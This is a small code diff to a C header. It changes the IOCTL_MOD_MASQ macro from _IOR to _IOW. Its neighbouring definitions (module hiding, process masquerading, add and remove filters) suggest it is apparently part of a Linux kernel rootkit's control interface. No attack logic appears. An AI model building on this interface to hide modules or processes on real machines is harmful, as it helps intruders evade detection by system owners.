@@ -24,7 +24,7 @@ struct filter_info {
 
 #define MAGIC 'k'
 #define IOCTL_MOD_HIDE _IO(MAGIC, 0)
-#define IOCTL_MOD_MASQ _IOR(MAGIC, 1, struct masq_proc_req)
+#define IOCTL_MOD_MASQ _IOW(MAGIC, 1, struct masq_proc_req)
 #define IOCTL_ADD_FILTER _IOR(MAGIC, 2, struct filter_info)
 #define IOCTL_REMOVE_FILTER _IOR(MAGIC, 3, struct filter_info)
 
